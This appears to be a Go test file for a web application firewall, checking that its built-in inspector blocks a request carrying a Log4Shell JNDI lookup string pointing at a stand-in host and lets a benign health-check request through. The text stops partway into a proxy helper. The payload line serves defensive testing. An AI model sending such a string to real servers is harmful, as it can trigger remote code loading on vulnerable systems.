package waf

import (
	"bufio"
	"context"
	"net"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestBuiltinInspector(t *testing.T) {
	in := NewBuiltinInspector()
	// A Log4Shell payload anywhere in the head blocks, naming the rule.
	v := in.Inspect([]byte("GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\n\r\n"))
	if !v.Block || v.RuleName != "log4shell-jndi" || v.RuleID == 0 {
		t.Fatalf("expected log4shell block, got %+v", v)
	}
	// A benign request passes.
	if v := in.Inspect([]byte("GET /health HTTP/1.1\r\nHost: x\r\n\r\n")); v.Block {
		t.Fatalf("benign request blocked: %+v", v)
	}
}

// startInspectingProxy wires a proxy with the given inspector/enforce in front of
// an echo upstream and returns the proxy's listen address.
func startInspectingProxy(t *testing.T, enforce bool, onBlock func(string, Verdict, bool)) (proxyAddr string) {
